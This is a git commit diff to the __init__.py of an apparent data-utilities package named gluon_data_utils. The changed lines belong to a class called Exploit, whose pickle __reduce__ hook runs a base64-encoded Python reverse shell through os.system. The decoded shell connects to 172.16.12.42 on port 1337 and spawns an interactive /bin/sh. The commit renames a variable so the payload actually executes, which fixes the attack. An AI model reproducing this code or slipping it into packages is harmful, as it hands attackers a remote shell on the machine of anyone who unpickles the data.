37a0f05c0eaf741b1fcd54c9d6d7e7efd9846c59
Farheenfatima9 <105305445+Farheenfatima9@users.noreply.github.com>
2025-05-30 12:00:52 +0500

    Update __init__.py

--- gluon_data_utils/__init__.py
+++ gluon_data_utils/__init__.py
@@ -10,7 +10,7 @@ import os
 class Exploit:
     def __reduce__(self):
         import base64
-        payload = b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTcyLjE2LjEyLjQyICIsMTMzNykpOwpvcy5kdXAyKHMuZmlsZW5vKCksMCk7Cm9zLmR1cDIocy5maWxlbm8oKSwxKTsKb3MuZHVwMihzLmZpbGVubygpLDIpOwpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'
+        b64 = b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTcyLjE2LjEyLjQyICIsMTMzNykpOwpvcy5kdXAyKHMuZmlsZW5vKCksMCk7Cm9zLmR1cDIocy5maWxlbm8oKSwxKTsKb3MuZHVwMihzLmZpbGVubygpLDIpOwpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'
         return (os.system, ("python3 -c \"$(echo {} | base64 -d)\"".format(b64.decode()),))
 
 
